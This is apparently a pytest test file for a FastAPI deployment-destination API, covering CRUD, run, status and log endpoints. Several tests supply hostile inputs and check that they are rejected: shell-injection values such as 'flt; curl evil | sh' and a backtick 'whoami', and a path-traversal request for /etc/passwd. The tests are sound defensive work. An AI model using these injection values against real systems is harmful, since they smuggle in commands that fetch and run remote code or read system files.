import pytest
from fastapi.testclient import TestClient
from sqlalchemy import select

from app.db.models import OpsDestination
from app.main import app


@pytest.mark.asyncio
async def test_ops_destination_model_roundtrip(db_session):
    dest = OpsDestination(
        id="teste",
        label="Teste",
        ssh_alias="flt",
        remote_base="/root/project",
        compose_file="docker-compose.alocalizai.yml",
        front_api_url="https://core.alocalizai.com.br/v1/",
        image_registry="ghcr.io/isakielsouza",
        image_tag="alocalizai",
        enabled=True,
    )
    db_session.add(dest)
    await db_session.commit()
    row = (
        await db_session.execute(select(OpsDestination).where(OpsDestination.id == "teste"))
    ).scalar_one()
    assert row.ssh_alias == "flt"
    assert row.enabled is True


def test_destinations_crud():
    # NOTA: o seed de startup (alocalizai) NÃO roda no app de teste (DB SQLite
    # in-memory criado via metadata.create_all no conftest, sem lifespan).
    # Por isso criamos o destino "alocalizai" via POST e validamos o GET nele,
    # em vez de assumir que o seed o inseriu.
    client = TestClient(app)

    seed = {
        "id": "alocalizai",
        "label": "Alocalizai",
        "ssh_alias": "flt",
        "remote_base": "/root/project",
        "compose_file": "docker-compose.alocalizai.yml",
        "front_api_url": "https://core.alocalizai.com.br/v1/",
        "registry": "ghcr.io/isakielsouza",
        "image_tag": "alocalizai",
        "enabled": True,
    }
    assert client.post("/api/v1/ops/destinations", json=seed).status_code == 200

    r = client.get("/api/v1/ops/destinations")
    assert r.status_code == 200
    assert any(d["id"] == "alocalizai" for d in r.json())

    body = {
        "id": "cliente2",
        "label": "Cliente 2",
        "ssh_alias": "cli2",
        "remote_base": "/root/project",
        "compose_file": "docker-compose.alocalizai.yml",
        "front_api_url": "https://core.cli2.com.br/v1/",
        "registry": "ghcr.io/isakielsouza",
        "image_tag": "cliente2",
        "enabled": True,
    }
    assert client.post("/api/v1/ops/destinations", json=body).status_code == 200
    assert (
        client.put(
            "/api/v1/ops/destinations/cliente2", json={**body, "ssh_alias": "cli2-novo"}
        ).status_code
        == 200
    )
    assert client.delete("/api/v1/ops/destinations/cliente2").status_code == 200
    r = client.get("/api/v1/ops/destinations")
    assert not any(d["id"] == "cliente2" for d in r.json())


def test_destination_rejects_injection():
    client = TestClient(app)
    base = {
        "id": "evil",
        "label": "Evil",
        "ssh_alias": "flt",
        "remote_base": "/root/project",
        "compose_file": "docker-compose.alocalizai.yml",
        "front_api_url": "https://core.x/v1/",
        "registry": "ghcr.io/isakielsouza",
        "image_tag": "t",
        "enabled": True,
    }

    # remote_base com injeção de shell → 422
    bad_base = {**base, "remote_base": "/x; curl evil"}
    assert client.post("/api/v1/ops/destinations", json=bad_base).status_code == 422

    # backtick em ssh_alias → 422
    bad_ssh = {**base, "ssh_alias": "flt`whoami`"}
    assert client.post("/api/v1/ops/destinations", json=bad_ssh).status_code == 422

    # válido → 200
    assert client.post("/api/v1/ops/destinations", json=base).status_code == 200


@pytest.mark.asyncio
async def test_run_rejects_preexisting_malicious_row(db_session):
    """Linha inserida DIRETO no DB (sem passar pelo Pydantic) com ssh_alias
    malicioso deve ser recusada no boundary do runner → 422, sem rodar nada."""
    dest = OpsDestination(
        id="legacy-evil",
        label="Legacy",
        ssh_alias="flt; curl evil | sh",  # metachar — bypassou o write-path
        remote_base="/root/project",
        compose_file="docker-compose.alocalizai.yml",
        front_api_url="https://core.x/v1/",
        image_registry="ghcr.io/x",
        image_tag="t",
        enabled=True,
    )
    db_session.add(dest)
    await db_session.commit()

    client = TestClient(app)
    r = client.post("/api/v1/ops/legacy-evil/run", json={"dry_run": False})
    assert r.status_code == 422
    assert "ssh_alias" in r.json()["detail"]["error"]


def test_run_unknown_destination_404():
    client = TestClient(app)
    r = client.post("/api/v1/ops/naoexiste/run", json={"dry_run": True})
    assert r.status_code == 404


def test_status_idle():
    client = TestClient(app)
    r = client.get("/api/v1/ops/status")
    assert r.status_code == 200
    assert r.json()["step"] in ("idle", "done", "failed")


def test_logs_rejects_path_traversal():
    client = TestClient(app)
    r = client.get("/api/v1/ops/logs/..%2F..%2F..%2Fetc%2Fpasswd")
    assert r.status_code in (400, 404)  # must NOT 200 with file contents


def test_logs_rejects_bad_format():
    client = TestClient(app)
    r = client.get("/api/v1/ops/logs/not-a-valid-runid")
    assert r.status_code == 400
